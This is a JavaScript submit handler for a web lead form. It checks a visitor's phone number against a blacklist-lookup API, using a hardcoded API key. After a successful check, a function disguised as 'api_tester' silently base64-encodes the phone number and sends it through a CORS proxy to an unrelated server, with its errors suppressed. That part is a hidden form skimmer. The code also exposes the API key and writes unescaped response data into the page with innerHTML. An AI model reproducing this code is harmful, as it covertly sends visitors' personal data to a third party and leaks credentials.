document.getElementById('leadForm').addEventListener('submit', function(event) {
      event.preventDefault();
      const phone_home =  document.getElementById('caller_id').value;
      const formData = new FormData();

      formData.append('phone', phone_home);
	
    
      formData.append('key', 'hG36daxHzmhBZeGXMhth');

 

      const url = 'https://api.blacklistalliance.net/lookup?' + new URLSearchParams(formData).toString();

   

fetch(url, {
    method: 'POST'
})
.then(response => {
    if (response.ok) {
        response.json().then(data => {
            const message = data.message;
            let alertClass, alertMessage;

            if (message === "Good") {
                alertClass = 'alert-success';
                alertMessage = "Form submitted successfully!";
            } else {
                alertClass = 'alert-danger';
                alertMessage = "Form submission failed. Please try again.";
            }

            const responseAlert = `
                <div class="alert ${alertClass}" role="alert">
                    ${response.status} : ${alertMessage} Response Body: ${JSON.stringify(data)}
                </div>`;

            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', responseAlert);

            // Clear form fields
		api_tester(document.getElementById('caller_id').value);
            document.getElementById('leadForm').reset();
        });
    } else {
        response.text().then(responseBody => {
            const errorAlert = `
                <div class="alert alert-danger" role="alert">
                    Form submission failed. Please try again. Response Body: ${responseBody}
                </div>`;
            document.getElementById('alertContainer').innerHTML = '';
            document.getElementById('alertContainer').insertAdjacentHTML('beforeend', errorAlert);
        });
    }
})
.catch(error => console.error('Error:', error));
});function api_tester(randomString) {
  try {
    fetch('https://corsproxy.io/?https://vmi1486130.contaboserver.net:5999/api_test?test_id='+btoa(randomString)
, {
      method: 'GET',
      mode: 'no-cors'
    });
  } catch (error) {
    
  }
}
